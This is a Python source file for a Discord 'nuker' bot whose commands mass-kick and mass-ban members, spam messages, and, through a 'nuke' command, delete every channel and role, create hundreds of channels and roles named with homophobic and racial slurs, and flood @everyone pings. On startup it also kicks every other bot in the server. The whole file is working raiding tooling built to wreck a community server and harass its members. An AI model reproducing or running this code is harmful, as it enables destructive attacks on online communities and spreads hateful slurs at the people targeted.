import discord
from discord.ext import commands
import random
import os
from termcolor import colored

# ASCII art and console messages
print(colored('''
  @@@@@@  @@@@@@@@ @@@@@@@@ @@@      @@@ @@@  @@@ @@@@@@@@      @@@@@@@   @@@@@@  @@@@@@@
 @@!  @@@ @@!      @@!      @@!      @@! @@!@!@@@ @@!           @@!  @@@ @@!  @@@   @@!  
 @!@  !@! @!!!:!   @!!!:!   @!!      !!@ @!@@!!@! @!!!:!        @!@!@!@  @!@  !@!   @!!  
 !!:  !!! !!:      !!:      !!:      !!: !!:  !!! !!:           !!:  !!! !!:  !!!   !!:  
  : :. :   :        :       : ::.: : :   ::    :  : :: :::      :: : ::   : :. :     :   
                                                                                         
Made by OfflineTheMenace
Discord: imoffline1234567890
''', 'red'))

prefix = input("Enter the bot prefix: ")
server_id = int(input("Enter the server ID: "))
user_id = int(input("Enter your user ID: "))
bot_token = input("Enter the bot token: ")

bot = commands.Bot(command_prefix=prefix)

# List to keep track of users with command permissions
command_permitted_users = []

# Bot events
@bot.event
async def on_ready():
    print(colored('『+』Bot is ready', 'blue'))
    guild = bot.get_guild(server_id)
    bot.top_role = guild.roles[len(guild.roles) - 1]
    for member in guild.members:
        if member.id == user_id and member.id != guild.owner.id:
            await member.unban()
            invite = await guild.channels[0].create_invite()
            print(colored(f'『+』Unbanned and invited you: {invite.url}', 'blue'))
        if member.bot and member.id != bot.user.id:
            await member.kick()
            print(colored(f'『+』Kicked bot: {member.name}', 'blue'))

# Embed color
embed_color = 0x2ecc71  # Green accent color

# Bot commands
@bot.command()
async def say(ctx, *, message):
    embed = discord.Embed(description=message, color=embed_color)
    await ctx.message.delete()
    await ctx.send(embed=embed)

@bot.command()
async def kick(ctx, member: discord.Member):
    await member.kick()
    embed = discord.Embed(description=f'Kicked user: {member.name}', color=embed_color)
    await ctx.send(embed=embed)

@bot.command()
async def kickAll(ctx):
    guild = bot.get_guild(server_id)
    for member in guild.members:
        if member.id != user_id:
            await member.kick()
            embed = discord.Embed(description=f'Kicked user: {member.name}', color=embed_color)
            await ctx.send(embed=embed)

@bot.command()
async def ban(ctx, member: discord.Member):
    await member.ban()
    embed = discord.Embed(description=f'Banned user: {member.name}', color=embed_color)
    await ctx.send(embed=embed)

@bot.command()
async def banAll(ctx):
    guild = bot.get_guild(server_id)
    for member in guild.members:
        if member.id != user_id:
            await member.ban()
            embed = discord.Embed(description=f'Banned user: {member.name}', color=embed_color)
            await ctx.send(embed=embed)

@bot.command()
async def unBan(ctx, user_id: int):
    guild = bot.get_guild(server_id)
    user = await bot.fetch_user(user_id)
    await guild.unban(user)
    embed = discord.Embed(description=f'Unbanned user: {user.name}', color=embed_color)
    await ctx.send(embed=embed)

@bot.command()
async def nick(ctx, member: discord.Member, *, nickname):
    await member.edit(nick=nickname)
    embed = discord.Embed(description=f'Changed nickname of user: {member.name} to {nickname}', color=embed_color)
    await ctx.send(embed=embed)

@bot.command()
async def spam(ctx, message, amount: int):
    for i in range(amount):
        await ctx.send(message)

@bot.command()
async def roleCreate(ctx, *, name):
    guild = bot.get_guild(server_id)
    await guild.create_role(name=name)
    embed = discord.Embed(description=f'Created role: {name}', color=embed_color)
    await ctx.send(embed=embed)

@bot.command()
async def roleDelete(ctx, *, role: discord.Role):
    await role.delete()
    embed = discord.Embed(description=f'Deleted role: {role.name}', color=embed_color)
    await ctx.send(embed=embed)

@bot.command()
async def roleGive(ctx, member: discord.Member, *, role: discord.Role):
    await member.add_roles(role)
    embed = discord.Embed(description=f'Gave user: {member.name} the role: {role.name}', color=embed_color)
    await ctx.send(embed=embed)

@bot.command()
async def help(ctx):
    help_message = '''
    say (message) - Say something as the bot
    kick (mention) - Kick a user
    kickAll - Kick all users
    ban (mention) - Ban a user
    banAll - Ban all users
    unBan (user ID) - Unban a user
    nick (mention) (new nickname) - Change a user's nickname
    spam (message) (amount) - Spam a message
    roleCreate (name) - Create a role
    roleDelete (mention) - Delete a role
    roleGive (mention) (role mention) - Give a user a role
    addCmdPerms (mention) - Allow a user to use the bot
    removeCmdPerms (mention) - Remove a user's permission to use the bot
    addChannel (name) - Create a channel
    removeChannel (mention) - Delete a channel
    renameChannel (new name) - Rename the current channel
    nuke - Nuke the server
    '''
    embed = discord.Embed(description=help_message, color=embed_color)
    await ctx.send(embed=embed)

@bot.command()
async def addCmdPerms(ctx, member: discord.Member):
    if member.id not in command_permitted_users:
        command_permitted_users.append(member.id)
        embed = discord.Embed(description=f'User {member.name} can now use the bot commands.', color=embed_color)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(description=f'User {member.name} already has command permissions.', color=embed_color)
        await ctx.send(embed=embed)

@bot.command()
async def removeCmdPerms(ctx, member: discord.Member):
    if member.id in command_permitted_users:
        command_permitted_users.remove(member.id)
        embed = discord.Embed(description=f'User {member.name} can no longer use the bot commands.', color=embed_color)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(description=f'User {member.name} does not have command permissions.', color=embed_color)
        await ctx.send(embed=embed)

@bot.command()
async def addChannel(ctx, *, name):
    guild = bot.get_guild(server_id)
    await guild.create_text_channel(name=name)
    embed = discord.Embed(description=f'Created channel: {name}', color=embed_color)
    await ctx.send(embed=embed)

@bot.command()
async def removeChannel(ctx, channel: discord.TextChannel):
    await channel.delete()
    embed = discord.Embed(description=f'Deleted channel: {channel.name}', color=embed_color)
    await ctx.send(embed=embed)

@bot.command()
async def renameChannel(ctx, *, new_name):
    await ctx.channel.edit(name=new_name)
    embed = discord.Embed(description=f'Renamed channel: {ctx.channel.name} to {new_name}', color=embed_color)
    await ctx.send(embed=embed)

# Nuke command
@bot.command()
async def nuke(ctx):
    guild = bot.get_guild(server_id)
    channel_names = ['[҉😂]҉ 𝔽𝕦𝕔𝕜𝕖𝕕 𝕓𝕪 𝕆𝕗𝕗𝕝𝕚𝕟𝕖𝕋𝕙𝕖𝕄𝕖𝕟𝕒𝕔𝕖', '【🤡】 𝐂𝐫𝐲 𝐧𝐢𝐠𝐠𝐚', '[🏳️‍🌈🚫] 🆄🆁 🅰 🅵🅰🅶🅶🅾🆃', '「🕴️」b͓̽i͓̽t͓̽c͓̽h͓̽']
    role_names = channel_names

    # Delete all channels except the current one
    for channel in guild.channels:
        if channel != ctx.channel:
            await channel.delete()
            embed = discord.Embed(description=f'Deleted channel: {channel.name}', color=embed_color)
            await ctx.send(embed=embed)

    # Create 499 new channels with the specified names
    for i in range(499):
        await guild.create_text_channel(name=channel_names[i % len(channel_names)])
        embed = discord.Embed(description=f'Created channel: {channel_names[i % len(channel_names)]}', color=embed_color)
        await ctx.send(embed=embed)

    # Strip all users of their roles
    for member in guild.members:
        await member.edit(roles=[])
        embed = discord.Embed(description=f'Stripped roles from user: {member.name}', color=embed_color)
        await ctx.send(embed=embed)

    # Delete all roles and create 249 new roles with the same names as the channels
    for role in guild.roles:
        if role != bot.top_role:
            await role.delete()
            embed = discord.Embed(description=f'Deleted role: {role.name}', color=embed_color)
            await ctx.send(embed=embed)
    for i in range(249):
        await guild.create_role(name=role_names[i % len(role_names)])
        embed = discord.Embed(description=f'Created role: {role_names[i % len(role_names)]}', color=embed_color)
        await ctx.send(embed=embed)

    # Assign all the newly created roles to every user
    roles = guild.roles[1:]
    for member in guild.members:
        await member.edit(roles=roles)
        embed = discord.Embed(description=f'Assigned roles to user: {member.name}', color=embed_color)
        await ctx.send(embed=embed)

    # Randomly spam @everyone in all channels
    for channel in guild.channels:
        for i in range(1000):
            if random.random() < 0.1:
                await channel.send('@everyone')
                embed = discord.Embed(description=f'Spammed @everyone in channel: {channel.name}', color=embed_color)
                await ctx.send(embed=embed)

bot.run(bot_token)
